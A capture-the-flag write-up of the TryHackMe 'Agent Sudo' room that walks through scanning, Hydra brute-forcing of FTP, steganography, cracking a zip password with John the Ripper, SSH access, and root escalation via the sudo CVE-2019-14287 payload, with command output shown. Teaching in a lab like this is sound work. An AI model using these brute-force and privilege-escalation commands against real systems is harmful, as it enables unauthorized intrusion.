# Agent Sudo
> 4lch3my | March 08, 2023
-------------------
#### You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
#### [Room Link](https://tryhackme.com/room/agentsudoctf)

## Tasks
##### 1. Author note
  Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.
<br>

##### 2.  Enumerate

 To start, I will use [nmap] which is default option on the personal Kali install I have. We start with a basic command
  `nmap -sC -sV -A MACHINE_IP `
The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A uses agressive mode, so we can follow along with the commands and enumeration.
  In our NMAP results we get:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 19:21 CET
Nmap scan report for MACHINE_IP
Host is up (0.080s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds
```
OK, so we see there are 3 ports open: `21 - FTP, 22 - SSH & 80 - HTTP`. Time to run gobuster to see what directorys we have on `port 80`: `gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`:

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://MACHINE_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/07 19:25:25 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
Progress: 220496 / 220561 (99.97%)
===============================================================
2023/03/07 19:44:52 Finished
===============================================================
```
Hmmm, interesting... It seems like we do not see any folders discovered by `gobuster`. We can also run Nikto while we are at it: `nikto -h http://MACHINE_IP/`

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          MACHINE_IP
+ Target Hostname:    MACHINE_IP
+ Target Port:        80
+ Start Time:         2023-03-07 19:38:32 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8046 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2023-03-07 19:45:46 (GMT1) (434 seconds)
---------------------------------------------------------------------------
```
This does not result in anything either. I guess it's time to visit the webpage it self.
<br>

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/page.png?raw=true)

Ahhh, so we need to use a custom user-agent to enter the "secret" page. I'm personally using Chrome and following along [THIS GUIDE](https://www.searchenginejournal.com/change-user-agent/368448/) on how to change the user-agent. For me it will be: `Inspect > More Tools > Network Conditions`, here I can deselect: `Use browser default`, add `Custom` and add the agent I want to use. The text on the website is signed by `Agent R`, so let's start with `R` nad refresh the page.

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/agent_r.png?raw=true)

Finally, we are getting somewhere. On the page we see `Are you one of the 25 employees?` what suspiciopusly reminds us of the English alphabet (yes, 26 letters, but maybe R is already used here?). 
<br> 

Let's start with the letter `A`. Nothing. Letter `B`. Nothing. Letter `C`. There we go: 

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/agent_c.png?raw=true)

We have found the hidden webpage: `http://MACHINE_IP/agent_C_[REDACTED].php` where we can see a username finally: `chris`. Time to brute force!
<br> 

##### 3. Hash cracking and brute-force

Starting off with `FTP`. Using our trusty old tool `Hydra` we can start the process with ease: `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP`:

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-07 20:20:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://MACHINE_IP:21/
[21][ftp] host: 10.10.233.10   login: chris   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-07 20:21:00
```
Only in a few minuites we where able to find the `password` for the user `chris`. Time to log-in!.
<br> 

```
ftp 10.10.233.10
Connected to 10.10.233.10.
220 (vsFTPd 3.0.3)
Name (10.10.233.10:elliot): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
Let's list out the files and copy them over to our machine:

```
ftp> ls
229 Entering Extended Passive Mode (|||34903|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||21405|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |***************************************************************************|   217      179.89 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (3.73 KiB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||49292|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |***************************************************************************| 34842      309.59 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (210.67 KiB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||16442|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |***************************************************************************| 33143      296.55 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (197.78 KiB/s)
ftp> quit
221 Goodbye.
```
Time to view the files. Starting with `To_agentJ.txt`:
```
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
From,
Agent C
```
This is a hint towards that we need to do some `steganography`. We can use the tool `binwalk` to look for anything interesting inside of these files and extact them, if they exist. 

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/binwalk.PNG?raw=true)

Aaannndd there we go, let's extract the contens from the `cutie.png` file:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/extract.PNG?raw=true)

Let's switch to the `_cutie.png.extracted` and view the files. As we can see we have a few files,some are empty and we are really only interested in the `8702.zip` file:
```
$ ls -la
total 324
drwxr-xr-x  2 elliot elliot   4096 Mar  7 21:01 .
drwx------ 15 elliot elliot   4096 Mar  7 20:57 ..
-rw-r--r--  1 elliot elliot 279312 Mar  7 20:55 365
-rw-r--r--  1 elliot elliot  33973 Mar  7 20:55 365.zlib
-rw-r--r--  1 elliot elliot    280 Mar  7 20:55 8702.zip
-rw-r--r--  1 elliot elliot      0 Oct 29  2019 To_agentR.txt
```
If we try to open it, we can see it is password locked:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/extract.PNG?raw=true)

Time to brute force again. We will use `John The Ripper` for this task, but first we need to convert this file to a readable format for `John The Ripper`. Let's use: `zip2john 8702.zip > file.hash` and then `john --wordlist=/usr/share/wordlists/rockyou.txt file.hash` to crack this!

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/zip_crack.PNG?raw=true)

With this password we can log in to the ZIP file and view the hidden message:

```
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R
```
This seems to be encoded, lets fire up [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=UVhKbFlUVXg) to find out if we are right:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/51.png?raw=true)

And there we go the password was encoded in `Base64`. On to the other file `cute-alien.jpg` using `steghide`: `steghide extract -sf cute-alien.jpg`. When prompted with a passphare we can add the newly generated Base64 decoded password from the image above.

```
wrote extracted data to "message.txt".
```
Let's read the file contens with `cat message.txt`:

```
Hi james,
Glad you find this message. Your login password is [REDACTED]!
Don't ask me why the password look cheesy, ask agent R who set this password for you.
Your buddy,
chris
```

With this we have the other user and the password for SSH as well. Talking about this...

##### 4. Capture the user flag

Now we can login as the user `james` with the newly found password over SSH: `ssh james@MACHINE_IP`. Now we have `user.txt`

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/user.png?raw=true)

On to the other file on the machine `Alien_autospy.jpg`. We will copy this file to our own host machine with `scp`: `scp james@MACHINE_IP:Alien_autospy.jpg /root/Desktop`.
<br> 

Now that is a bizarre looking image. Trying to look for clues via `steghide` and `binwalk` does not show aynthing, so I needed to look at the HINT provided by TryHackMe. A simple google search... Anyway moving on...

##### 5. Capture the user flagPrivilege escalation

Time to check what accesses we have as sudo on this machine

```
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Let's do a quick Google search for `(ALL, !root) /bin/bash`. Would you look at that. A known CVE from 2019:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/cve.png?raw=true)

With this info, we can navigate to the [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287) to learn more about this vulnerability. On this site in the first paragraph, we can see this:

```
In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))" command.
```
We should test, right? 

```
james@agent-sudo:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash 
root@agent-sudo:~# ls
Alien_autospy.jpg  user_flag.txt
```
WOW! We are finally a `root` user!

```
root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f[REDACTED]c062

By,
[REDACTED] a.k.a Agent R
root@agent-sudo:~# 
```

And that's it! We know Agent R and the root flag! 

#### Thank you for checking out my write-up about the THM room: Agent Sudo! If you are interested in other write-ups of mine or interetsed in some of my codeing work, please feel free to look around my GitHub page! Happy hacking! - 4lch3my